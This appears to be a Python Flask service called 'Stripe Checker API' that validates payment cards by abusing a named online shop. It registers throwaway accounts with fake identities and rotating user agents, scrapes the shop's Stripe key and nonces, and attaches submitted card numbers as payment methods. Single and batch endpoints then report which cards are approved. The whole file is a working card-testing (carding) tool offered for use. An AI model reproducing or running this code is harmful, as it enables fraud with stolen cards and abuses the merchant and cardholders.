import requests, re, json, random
import os
from faker import Faker
from bs4 import BeautifulSoup
from flask import Flask, request, jsonify

app = Flask(__name__)
fake = Faker()
domain = "https://www.epicalarc.com"

def generate_user():
    fname = fake.first_name().lower()
    lname = fake.last_name().lower()
    email = f"{fname}{lname}{random.randint(1000,9999)}@example.com"
    password = fake.password(length=10, special_chars=True)
    return fname, lname, email, password

def register_user(session):
    fname, lname, email, password = generate_user()
    res = session.get(f"{domain}/my-account/")
    soup = BeautifulSoup(res.text, "html.parser")
    nonce = soup.find("input", {"name": "woocommerce-register-nonce"})["value"]
    referer = soup.find("input", {"name": "_wp_http_referer"})["value"]
    data = {
        "email": email,
        "password": password,
        "register": "Register",
        "woocommerce-register-nonce": nonce,
        "_wp_http_referer": referer,
    }
    headers = {
        "origin": domain,
        "referer": f"{domain}/my-account/",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": fake.user_agent(),
    }
    session.post(f"{domain}/my-account/", headers=headers, data=data)
    return session

def get_stripe_key_and_nonce(session):
    res = session.get(f"{domain}/my-account/add-payment-method/")
    html = res.text
    stripe_pk = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', html)
    nonce = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html)
    if not stripe_pk or not nonce:
        raise Exception("Failed to extract stripe_pk or nonce")
    return stripe_pk.group(0), nonce.group(1)

def create_payment_method(stripe_pk, card, exp_month, exp_year, cvv):
    headers = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": fake.user_agent(),
    }
    data = {
        "type": "card",
        "card[number]": card,
        "card[cvc]": cvv,
        "card[exp_year]": exp_year[-2:],
        "card[exp_month]": exp_month,
        "billing_details[address][postal_code]": "10001",
        "billing_details[address][country]": "US",
        "payment_user_agent": "stripe.js/84a6a3d5; stripe-js-v3/84a6a3d5; payment-element",
        "key": stripe_pk,
        "_stripe_version": "2024-06-20",
    }
    response = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data)
    
    # Added JSON response handling
    if response.headers.get("Content-Type", "").startswith("application/json"):
        try:
            json_data = response.json()
        except requests.exceptions.JSONDecodeError:
            print("Response is not valid JSON")
            return None, "Response is not valid JSON"
        else:
            if "id" in json_data:
                return json_data["id"], None
            else:
                # Get the error message safely
                error_message = json_data.get("error", {}).get("message", "Unknown error")
                print(f"Payment failed: {error_message}")
                return None, error_message
    return None, "Invalid response from Stripe"

def confirm_setup(session, pm_id, nonce):
    headers = {
        "x-requested-with": "XMLHttpRequest",
        "origin": domain,
        "referer": f"{domain}/my-account/add-payment-method/",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "user-agent": fake.user_agent(),
    }
    data = {
        "action": "create_and_confirm_setup_intent",
        "wc-stripe-payment-method": pm_id,
        "wc-stripe-payment-type": "card",
        "_ajax_nonce": nonce,
    }
    res = session.post(f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", headers=headers, data=data)
    return res.text

def check_card_api(card_input):
    try:
        card, month, year, cvv = card_input.split("|")
        
        session = requests.Session()
        session = register_user(session)
        stripe_pk, nonce = get_stripe_key_and_nonce(session)
        pm_id, pm_error = create_payment_method(stripe_pk, card, month, year, cvv)
        
        if not pm_id:
            return {
                "status": "declined",
                "message": pm_error or "Failed to create Payment Method",
                "gateway": "Stripe Auth v5",
                "card_last4": card[-4:]
            }
        
        result = confirm_setup(session, pm_id, nonce)
        
        try:
            rjson = json.loads(result)
            data = rjson.get("data", {})
            status = data.get("status", "")
            
            # APPROVED
            if rjson.get("success") is True and status == "succeeded":
                return {
                    "status": "APPROVED ✅",
                    "message": "Payment successfully added ✅🔥",
                    "gateway": "Stripe Auth v5",
                    "details": {
                        "setup_intent": data.get("id", "N/A"),
                        "payment_method": pm_id,
                        "card_last4": card[-4:]
                    }
                }
            
            # DECLINED
            decline_message = None
            
            # 1️⃣ Stripe standard error
            decline_message = data.get("error", {}).get("message")
            
            # 2️⃣ Stripe last_payment_error
            if not decline_message:
                decline_message = data.get("last_payment_error", {}).get("message")
            
            # 3️⃣ Global message fallback
            if not decline_message:
                decline_message = rjson.get("message", "Your card was declined")
                
            return {
                "status": "DECLINED ❌",
                "message": decline_message,
                "gateway": "Stripe Auth v5",
                "details": {
                    "payment_method": pm_id,
                    "card_last4": card[-4:]
                }
            }
            
        except Exception as e:
            return {
                "status": "error",
                "message": str(e),
                "raw_response": result[:500] if result else "No response",
                "gateway": "Stripe Auth v5"
            }
            
    except ValueError:
        return {
            "status": "error",
            "message": "Invalid card format. Use: cc|mm|yy|cvv",
            "gateway": "Stripe Auth v5"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": str(e),
            "gateway": "Stripe Auth v5"
        }

@app.route('/ch', methods=['GET'])
def check_card():
    card_input = request.args.get('card')
    
    if not card_input:
        return jsonify({
            "status": "ERROR 🚨",
            "message": "Card parameter is required. Format: cc|mm|yy|cvv",
            "gateway": "Stripe Auth v5"
        }), 400
    
    result = check_card_api(card_input)
    return jsonify(result)

@app.route('/batch-check', methods=['POST'])
def batch_check():
    data = request.get_json()
    
    if not data or 'cards' not in data:
        return jsonify({
            "status": "error",
            "message": "JSON body with 'cards' array is required"
        }), 400
    
    cards = data['cards']
    if not isinstance(cards, list):
        return jsonify({
            "status": "error",
            "message": "'cards' must be an array"
        }), 400
    
    results = []
    for card_input in cards:
        result = check_card_api(card_input)
        result['card_input'] = card_input
        results.append(result)
    
    return jsonify({
        "total": len(results),
        "approved": sum(1 for r in results if r.get('status') == 'approved'),
        "declined": sum(1 for r in results if r.get('status') == 'declined'),
        "error": sum(1 for r in results if r.get('status') == 'error'),
        "results": results
    })

@app.route('/', methods=['GET'])
def home():
    """Simple homepage with instructions"""
    return """
<!DOCTYPE html>
<html>
<head>
    <title>Stripe Checker API</title>
    <style>
        body {
            font-family: monospace;
            background: black;
            color: lime;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        h1 {
            color: cyan;
            border-bottom: 1px solid lime;
        }
        code {
            background: #333;
            padding: 10px;
            display: block;
            margin: 10px 0;
            border-left: 3px solid cyan;
        }
        .success {
            color: lime;
        }
        .error {
            color: red;
        }
        .example {
            color: yellow;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔧 Stripe Checker API</h1>
        
        <h2>📡 Endpoint:</h2>
        <code>GET /ch?card=nn|mm|yy|cvv</code>
        
        <h2>📝 Format:</h2>
        <p><span class="example">card_number|exp_month|exp_year|cvv</span></p>
        
        <h2>🎯 Example:</h2>
        <code>/ch?card=4242424242424242|12|28|123</code>
        
        <h2>✅ Test Cards:</h2>
        <code>4242424242424242|12|28|123</code>
        
        <h2>📊 Response:</h2>
        <pre>
"status": "APPROVED ✅/DECLINED ❌/ERROR 🚨",
"message": "Detailed message",
"gateway": "Stripe Auth v5",
"details": "Additional info (if available)"
        </pre>
        
        <h2>⚡ Usage:</h2>
        <code>curl "http://localhost:5000/ch?card=4242424242424242|12|28|123"</code>
        
        <h2>❓ Help:</h2>
        <p>Send GET request to <span class="example">/ch</span> with card parameter</p>
    </div>
</body>
</html>
"""

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════╗
    ║   Stripe Checker API - Basic Coders   ║
    ╚═══════════════════════════════════════╝
    
    🚀 Server started!
    
    📍 Endpoint: GET /ch?card=nn|mm|yy|cvv
    🌐 Homepage: http://localhost:5000
    
    📝 Example:
    http://localhost:5000/ch?card=4242424242424242|12|25|123
    
    🔧 By: Basic Coders
    """)
    
    # Run the app
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
